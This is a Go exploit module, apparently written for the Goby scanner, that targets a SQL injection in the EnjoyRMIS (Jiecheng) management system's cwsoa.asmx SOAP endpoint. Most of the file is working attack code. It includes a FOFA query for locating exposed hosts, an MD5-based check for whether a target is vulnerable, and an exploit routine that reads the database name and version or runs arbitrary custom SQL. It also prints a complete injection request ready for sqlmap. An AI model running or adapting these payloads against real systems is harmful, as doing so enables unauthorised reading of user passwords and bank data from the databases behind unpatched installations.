package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "EnjoyRMIS /EnjoyRMIS_WS/WS/POS/cwsoa.asmx SQL Injection Vulnerability",
    "Description": "<p>Jiecheng Management Information System is a comprehensive management information system that can support the management of self-operation, joint operation to external cabinet leasing, and its own workflow management tools can help enterprises effectively carry out internal approval work. SQL injections exist in multiple interfaces of CWSFinanceCommon.asmx, CWSHr.asmx, and cwsoa.asmx.</p>",
    "Product": "Jiecheng Management Information System",
    "Homepage": "http://www.syjctech.com/",
    "DisclosureDate": "2024-10-29",
    "PostTime": "2024-11-13",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"CheckSilverlightInstalled\" && title=\"信息系统\"",
    "GobyQuery": "body=\"CheckSilverlightInstalled\" && title=\"信息系统\"",
    "Level": "1",
    "Impact": "<p>Attackers can read sensitive information in databases, such as user passwords and bank accounts, resulting in user privacy leakage.</p>",
    "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data. </p><p> 2. The manufacturer has released a fixed version, please follow the official website <a href=\"http://www.syjctech.com/\">http://www.syjctech.com/</a></p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/EnjoyRMIS/EnjoyRMIS-GetOAById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "db_name,version,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "捷诚管理信息系统 /EnjoyRMIS_WS/WS/POS/cwsoa.asmx SQL 注入漏洞",
            "Product": "捷诚管理信息系统",
            "Description": "<p>捷诚管理信息系统是一款功能全面，可以支持自营、联营到外柜租赁的管理，其自身带工作流管理工具，能够帮助企业有效的开展内部审批工作。该产品CWSFinanceCommon.asmx、CWSHr.asmx、cwsoa.asmx多处接口存在SQL注入。<br><br></p>",
            "Recommendation": "<p>1、对用户输入进行严格的验证和过滤，确保输入数据的合法性和安全性。<br></p><p>2、该厂商已发布修复版本，关注官网<a href=\"http://www.syjctech.com/\">http://www.syjctech.com/</a></p>",
            "Impact": "<p>攻击者可以读取数据库中的敏感信息，如用户密码、银行账户等，导致用户隐私泄露。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "EnjoyRMIS /EnjoyRMIS_WS/WS/POS/cwsoa.asmx SQL Injection Vulnerability",
            "Product": "Jiecheng Management Information System",
            "Description": "<p>Jiecheng Management Information System is a comprehensive management information system that can support the management of self-operation, joint operation to external cabinet leasing, and its own workflow management tools can help enterprises effectively carry out internal approval work. SQL injections exist in multiple interfaces of CWSFinanceCommon.asmx, CWSHr.asmx, and cwsoa.asmx.<br></p>",
            "Recommendation": "<p>1. Strictly verify and filter user input to ensure the legitimacy and security of input data.&nbsp;</p><p>&nbsp;2. The manufacturer has released a fixed version, please follow the official website <a href=\"http://www.syjctech.com/\">http://www.syjctech.com/</a><br></p>",
            "Impact": "<p>Attackers can read sensitive information in databases, such as user passwords and bank accounts, resulting in user privacy leakage.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9971"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(url)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetOAById xmlns=\"http://tempuri.org/\">\n      <sId>string' AND 8448 IN (" + sql + "+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>\n    </GetOAById>\n  </soap:Body>\n</soap:Envelope>"
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "close",
			"Content-Type":    "text/xml; charset=utf-8",
			"SOAPAction":      "\"http://tempuri.org/GetOAById\"",
		}
		urlget := "/EnjoyRMIS_WS/WS/POS/cwsoa.asmx"
		resp, err = setPostRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/EnjoyRMIS_WS/WS/POS/cwsoa.asmx"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			checkValue := goutils.RandomHexString(6)
			hash := md5.New()
			hash.Write([]byte(checkValue))
			content := hex.EncodeToString(hash.Sum(nil))

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			sql := "SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+LOWER(CONVERT(VARCHAR(32), HASHBYTES('MD5', '" + checkValue + "'), 2))"

			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			defaultModeMap := map[string]string{
				"db_name": "SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+DB_NAME()",
				"version": "SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+@@version",
			}

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "Encode the data packet by itself:\n" +
				"POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"Content-Type: text/xml; charset=utf-8\n" +
				"Soapaction: \"http://tempuri.org/GetOAById\"\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36\n" +
				"Accept-Encoding: gzip, deflate\n\n" +
				"<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<soap:Envelope\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n  xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\n>\n  <soap:Body>\n    <GetOAById xmlns=\"http://tempuri.org/\">\n      <sId\n      >string' AND 8448 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8448=8448) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(32)+LOWER(CONVERT(VARCHAR(32), HASHBYTES('MD5', '123456'), 2))+CHAR(32)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(113))) AND 'OFyo'='OFyo</sId>\n    </GetOAById>\n  </soap:Body>\n</soap:Envelope>"
			// 3.配置正则语句，从响应包中提取出数据
			regular := `(?s)qqqzq(.*?)1qvkqq`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "db_name" {
				sql := defaultModeMap["db_name"]
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "version" {
				sql := defaultModeMap["version"]
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
